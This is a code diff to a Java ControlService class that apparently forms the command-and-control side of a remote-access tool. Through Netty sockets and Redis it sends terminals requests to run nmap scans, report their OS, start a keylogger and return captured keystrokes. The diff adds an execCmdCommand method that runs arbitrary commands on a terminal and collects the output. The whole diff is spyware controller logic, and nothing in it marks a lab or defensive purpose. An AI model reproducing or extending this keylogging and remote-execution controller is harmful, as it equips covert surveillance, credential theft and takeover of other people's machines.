@@ -4,19 +4,24 @@ package service;
 import java.net.UnknownHostException;
 
 import Config.Config;
+import com.google.gson.Gson;
 import io.netty.channel.Channel;
 import io.netty.channel.ChannelId;
 import io.netty.channel.group.ChannelGroup;
+import javabean.SocketInfo;
 import netty.NettyServerBootstrap;
-import org.junit.Test;
 import redis.RedisUtil;
 
 public class ControlService implements ControlServiceImp {
     private NettyServerBootstrap bootstrap;
     private RedisUtil redisUtil;
+    private SocketInfo socketInfo;
+    private Gson gson;
 
 
     public ControlService() throws InterruptedException {
+        socketInfo = new SocketInfo();
+        gson = new Gson();
         init();
     }
 
@@ -51,26 +56,38 @@ public class ControlService implements ControlServiceImp {
 
     @Override
     public boolean runNmap(String terminalID) {
-        sendMesg(terminalID, "nmap");
+        socketInfo.setResultMsg("");
+        socketInfo.setResultCode(Config.Request_Code_Nmap);
+
+        sendMesg(terminalID, gson.toJson(socketInfo));
         return true;
     }
 
     @Override
     public String runGetos(String terminalID) {
-        sendMesg(terminalID, "getos");
+        socketInfo.setResultMsg("");
+        socketInfo.setResultCode(Config.Request_Code_GetRunGetOs);
+        sendMesg(terminalID, gson.toJson(socketInfo));
         return null;
     }
 
     @Override
     public String getGetos(String terminalID) {
-        System.out.println(redisUtil.getTerminalOsinfo(terminalID));
+        socketInfo.setResultMsg("");
+        socketInfo.setResultCode(Config.Request_Code_RunRunGetOs);
+        sendMesg(terminalID, gson.toJson(socketInfo));
+
         return redisUtil.getTerminalOsinfo(terminalID);
     }
 
     @Override
     public String startKeyLogger(String terminalID) {
-        sendMesg(terminalID, "keylogger_start");
-        redisUtil.setTerminalKeyLoggerStatus(terminalID, "" + -1);
+
+        socketInfo.setResultMsg("");
+        socketInfo.setResultCode(Config.Request_Code_KeyLogger_Start);
+        sendMesg(terminalID, gson.toJson(socketInfo));
+
+        redisUtil.setTerminalKeyLoggerStatus(terminalID, "-1");
         redisUtil.setTerminalKeyLoggerInfo(terminalID, "-1");
         try {
             Thread.sleep(3 * 1000);
@@ -82,13 +99,29 @@ public class ControlService implements ControlServiceImp {
 
     @Override
     public String overKeyLogger(String terminalID) {
-        sendMesg(terminalID, "keylogger_show");
+        socketInfo.setResultMsg("");
+        socketInfo.setResultCode(Config.Request_Code_KeyLogger_Show);
+        sendMesg(terminalID, gson.toJson(socketInfo));
         try {
             Thread.sleep(2 * 1000);
         } catch (InterruptedException e) {
             e.printStackTrace();
         }
         return redisUtil.getTerminalKeyLoggerInfo(terminalID);
+    }
+
+    @Override
+    public String execCmdCommand(String terminalID, String msg) {
+        socketInfo.setResultMsg(msg);
+        socketInfo.setResultCode(Config.Request_Code_RunCmd);
+        sendMesg(terminalID, gson.toJson(socketInfo));
+        try {
+            Thread.sleep(1 * 1000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        return redisUtil.getTerminalCmdInfo(terminalID);
     }
 
 
